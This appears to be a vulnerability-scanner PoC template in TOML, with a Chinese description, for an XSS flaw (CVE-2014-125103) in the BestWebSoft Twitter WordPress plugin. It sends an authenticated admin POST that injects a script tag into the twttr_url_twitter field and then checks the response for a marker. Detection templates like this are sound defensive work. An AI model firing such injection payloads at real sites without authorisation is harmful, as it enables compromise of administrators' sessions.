[info]
id = "POC-AVE-2014-0003"
name = "WordPress BestWebSoft Twitter 跨站脚本 PoC"
author = "AVE"
severity = "medium"
tags = ["xss", "cve-2014-125103", "wordpress", "bestwebsoft", "twitter"]
description = "WordPress BestWebSoft Twitter插件(版本1.3.2及之前)的twitter.php文件中twttr_settings_page函数存在跨站脚本漏洞。twttr_url_twitter参数在输出前未经过滤，攻击者可注入恶意脚本。需要在WordPress后台已登录状态下测试。"
vuln_id = ["CVE-2014-125103", "AVE-2014-0003"]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/wp-admin/admin.php"

query.page = "twitter.php"

headers.Content-Type = "application/x-www-form-urlencoded"
headers.Cookie = "wordpress_={{session}}"

body.type = "form"
body.twttr_url_twitter = "\"><script>alert('AVE_POC_XSS')</script>"
body.bws_license_key = ""
body.bws_license_plugin = ""
body.twttr_submit = "Save Changes"

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["AVE_POC_XSS"]
expect = true
